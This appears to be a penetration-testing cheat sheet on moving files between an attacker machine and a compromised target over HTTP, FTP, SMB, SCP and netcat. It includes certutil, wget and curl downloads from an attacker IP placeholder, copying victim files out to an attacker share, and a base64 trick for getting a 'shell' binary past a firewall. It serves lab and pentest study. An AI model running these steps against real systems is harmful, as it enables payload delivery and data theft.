# Transfert file between target and attacking machines

## HTTP

### From attack machine to Target

#### Attacking machine

- In kali we can use python `python3 -m http.server 80`

#### Target machine

- On a win target machine you can access it directly with the browser: `http://IP-ATTACKING-MACHINE/FILE-TO-GET` or you can use certutil.exe `certutil.exe -urlcache http://IP-ATTACKING-MACHINE/FILE-TO-GET file-to-get`
- In a linux target machine you can use `wget http://IP-ATTACKING-MACHINE/FILE-TO-GET` or curl `curl -o FILE-TO-GET http://IP-ATTACKING-MACHINE/FILE-TO-GET`

#### Updog

- Another great tool to transfer is [updog](https://github.com/sc0tfree/updog), it goes both ways if you can access a browser :D :D :D
- `pip3 install updog` easy as this to install
- 

## FTP

### From attack machine to target

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

####  Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `get filename` to get the file

### From Target to attack

#### Attacking machine

- `python3 -m pyftpdlib -p 21 --write`

####  Target machine

- `ftp IP-OF-ATTACKING-MACHINE` we can then use `put filename` to send the file
- `curl --user anonymous:anonymous -o docker-toolbox.exe ftp://10.10.10.236/docker-toolbox.exe`

## SMB

### From Target to attack machine

#### Attacking machine

- In kali we can use Impacket `python3 smbserver.py -smb2support sharename /path/folder`
- We can specify `-username user -password pass` if we need set up an authentication

#### Target machine

- In a win victim machine we just need to copy the file to the attacking machine: `copy  FiletoDownload \\IP-OFF-ATTACKING-MACHINE\SHARENAME`
- Sometimes on windows we will be asked to use a service that requires authentication so we can set this up with `net use \\<network-location>\<some-share> password /USER:username` after this we will be able to use the previous copy command

## Metasploit

### From attack machine to Target

There is an upload and download feature

## SSH (creds needed)

### From attack machine to Target (local to remote)

- In your kali or any linux `scp FILE-TO-SEND user@ip:/path/to/folder`

### From target to attack (remote to local)

- In your kali or any linux cmd `scp user@ip:/path/to/folder FILE-TO-GET`

### Note

- If you get this error `protocol error: filename does not match request`
- You will need to add `-T` in your command. Here is an example:
- `scp -T user@server:C:\\Path\\To\\file.txt dest-folder`

## Netcat

### From Target to attack machine

#### Target machine

- `nc -lvp PORT-NUMBER > FILE-TO-SEND

#### Attacking machine

- `nc VICTIM-IP PORT-NUMBER -w 3 < FILE` note: -w is for the time out in seconds

## Evade firewall

In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:  

- `base64 shell -w 0`

Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:  

- `echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ..lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`

### Validate file

- `file shell`
- `md5sum shell` and compare the result in the attacking machine and target

*Source Hackthebox Academy*

## Resources

{% embed url="https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/" %} Transfer files (Post explotation) – CheatSheet - PABLO PLAZA MARTÍNEZ {% endembed %}
